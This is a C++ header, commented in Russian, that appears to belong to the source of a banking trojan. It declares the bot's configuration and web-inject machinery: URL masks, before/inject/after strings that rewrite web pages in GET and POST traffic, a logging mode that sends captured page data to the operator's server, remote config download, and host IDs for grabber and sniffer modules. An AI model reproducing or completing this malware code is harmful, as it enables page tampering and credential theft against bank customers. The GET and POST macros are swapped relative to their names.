// -----------------------------------------------------------------------------

#ifndef BotConfigH
#define BotConfigH

// В дальнейшем планируется разделение инжектов от конфига, нро в
// данный момент включение/отключение HTKL инжектов оставляем в этом модуле
#define HTMLInjectsH

// -----------------------------------------------------------------------------

#include <windows.h>
#include "Strings.h"
#include "Requests.h"
#include "BotClasses.h"
#include "Requests.h"


#define VERB_IS_POST hmGET
#define VERB_IS_GET  hmPOST

#define MAX_POST_DATA_SIZE 5000
#define MIN_POST_DATA_SIZE 5



#define FGRHOSTFROMCFG		1
#define GRAHOSTFROMCFG		2
#define SCRHOSTFROMCFG		3
#define SNIHOSTFROMCFG		4
#define PLUGINSHOSTFROMCFG	5


const static char ConfigSignature[] = {'B', 'J', 'B', 0};

class TBotConfig;
class THTMLInjectList;
class THTMLInject;
class THTMLInjectData;



//---------------------------------------------
//  THTMLInjectList - Список HTML инжектов
//---------------------------------------------
class THTMLInjectList : public TBotCollection, public TEventContainer
{
private:
	friend class THTMLInject;
	friend class TBotConfig;
protected:
	bool GetInjectsForURL(THTTPMethod Method, const char *URL, PList List);
public:
	TValues* Variables;

	THTMLInjectList();
	~THTMLInjectList();

    void Clear();
	THTMLInject* AddInject();
	void ResetInjectsStatus();

	bool LoadFromMem(LPVOID Buf, DWORD BufSize);
	void ReleaseInjects(PList Injects);
	bool GetInjectsForRequest(PRequest Request);
    bool IsInjectURL(const char* URL, THTTPMethod Method = hmUnknown);

	inline THTMLInject* Items(int Index) const { return (THTMLInject*)((TBotCollection*)this)->Items(Index); }
};


//---------------------------------------------
//  THTMLInject - HTML инжект
//---------------------------------------------
class THTMLInject : public TBotCollectionItem, public TEventContainer
{
private:
	TBotCollection* FItems;     // Список инжектов (список элементов типа PHTMLInject)
	LONG            FRefCount;  // Количество текущих блокировок инжекта

	void AddRef();
	void Release();

	friend class THTMLInjectList;
	friend class THTMLInjectData;
public:
	string URL;        // Маска сайта для которого необходимо обрабатывать страницы
	bool   GET; 	   // Обрабатывать GET запросы
	bool   POST;       // Обрабатывать POST запросы
	bool   IsLog;      // Логировать HTML. Вместо подмены отправлять данные на сервер
	bool   Disabled;   // Не использовать инжект (Для отладочной программы)
	bool   Activated;  // Признак того что маска использовалась
	DWORD  ID;         // Ижентификатор, Для внутренних нужд
	string Comment;    // Коментарий к инжекту, только для редактора

	THTMLInject(THTMLInjectList *aOwner);
	~THTMLInject();

	THTMLInjectData*        AddData();
	inline void             Clear() { FItems->Clear(); }
	inline int              Count() {return FItems->Count(); }
    int                     ContainVariable(const char* VarName);
	inline THTMLInjectData* Items(int Index) const {return (THTMLInjectData*)FItems->Items(Index); }
};



enum TInjectDataState {idsUnknown, idsOk, idsError};


//---------------------------------------------
//  THTMLInjectData - данные HTML инжекта
//---------------------------------------------
class THTMLInjectData : public TBotCollectionItem, public TEventContainer
{
private:
	THTMLInject* FOwner;
protected:

public:
	string Before;
	string Inject;
	string After;
    DWORD  ID;         // Ижентификатор
	TInjectDataState State;
    DWORD MacrosHash;  // Хэш данных  для определения макроса инжекта
	bool Disabled;     // Не использовать инжект (Для отладочной программы)

	THTMLInjectData(THTMLInject *aOwner);

	inline THTMLInject* Owner() {return FOwner;}
	void Copy(const THTMLInjectData &Data);

	bool IsValid();
};



//***********************************************************
//  TBotConfig  - Настройки бота из конфигурационного файла
//***********************************************************
class TBotConfig : public TBotObject
{
public:
	THTMLInjectList *HTMLInjects;

	TBotConfig();
	~TBotConfig();

	void Clear();
	bool LoadFromFile(const string &FileName);
};


//***********************************************************
//  TBJBConfigReader - Класс чтения настроек из BJB конфига
//***********************************************************
class TBJBConfigReader : public TBotObject
{
private:
	LPVOID FBuf;
	DWORD  FSize;
public:
	TBJBConfigReader(LPVOID Buf, DWORD BufSize);
    bool Read(TBotConfig* Config);
};




//*********************************************************
//  SetHTMLInjectEvent - установить метод обработки
//		событий HTML инжекта
//*********************************************************
// Метод, событие HTML инжекта
enum THTMLInjectEventID {injCustom, injMaskFinded, injDataHandled};
typedef void(*THTMLInjectEvent)(LPVOID Data,        	// Данныве с которыми зарегистрировано событие
								LPVOID Sender, 	    	// источник события
								THTMLInjectEventID ID,  // Идентификатор события
								LPVOID Reserver);      	// Зарезервировано

void SetHTMLInjectEvent(LPVOID Data, THTMLInjectEvent Event);



//*****************************************************************
//  Методы для работы с гобальными данными конфига
//*****************************************************************
namespace Config
{
	//*********************************************************
	//	Initialize - Инициализировать глобальные
	//  	настройки бота. Если указао имя файла FileName то
	//  	настройки будут прочитаны из него, в противном
	//  	случае настройки будут прочитаны из файла имя
	//      которого задано в коде бота.
	//*********************************************************
	TBotConfig* Initialize(PCHAR FileName = NULL);

	// Функция возвращает указатель на конфиг бота
	TBotConfig* GetConfig();


    void Clear(TBotConfig* Config);

	//  Функция возврашает имя файла конфига
	string GetFileName(bool HightPriority = false);

	//  Функция устанавливает имя файла конфига
	void SetFileName(const char *FileName);

	// Загрузить конфиг
	bool Download(PCHAR URL);

	// Функция возвращает истину если буфер является конфигом
    bool IsConfig(PCHAR Buf);

	//  GetInjectsForRequest - Получить инжекты для запроса
	bool GetInjectsForRequest(PRequest Request);

	// Функция проверяет есть ли для указанного адреса инжект
	bool IsInjectURL(PCHAR URL, THTTPMethod Method);
}


// HTML_INJECT_MACROS - HIM

#define HIM_REPLACE_DOCUMENT 0x6A665EA5 /* $REPLACE_DOCUMENT$ */


//****************************************************************************
//	HTMLInjects - Методы для работы с HTML инжектами
//****************************************************************************
namespace HTMLInjects
{

	//*********************************************************
	//  Выполнить HTML инжекты.
	//
	//  Результат - функция возвращает истину если в буффер
	//              запроса были внесены изменения
	//*********************************************************
	bool Execute(PRequest Request, PHTTPSessionInfo Session);

	//*********************************************************
	// Функция возвращает истину если указанный тип контента
	// поддерживается методами инжекта HTML
	//*********************************************************
	bool SupportContentType(PCHAR CType);

	//*********************************************************
	//  Методы уничтожения данных HTML инжекта
	//*********************************************************
	void FreeInject(THTMLInject *Inject);

	//*********************************************************
	// ReleaseInjectsList - Фуекция освобождает список инжектов
	//                      которые были выделены для запроса
	// List - Список выделенных инжектов
	//*********************************************************
    void ReleaseInjectsList(PList List);
}

// -----------------------------------------------------------------------------
#endif
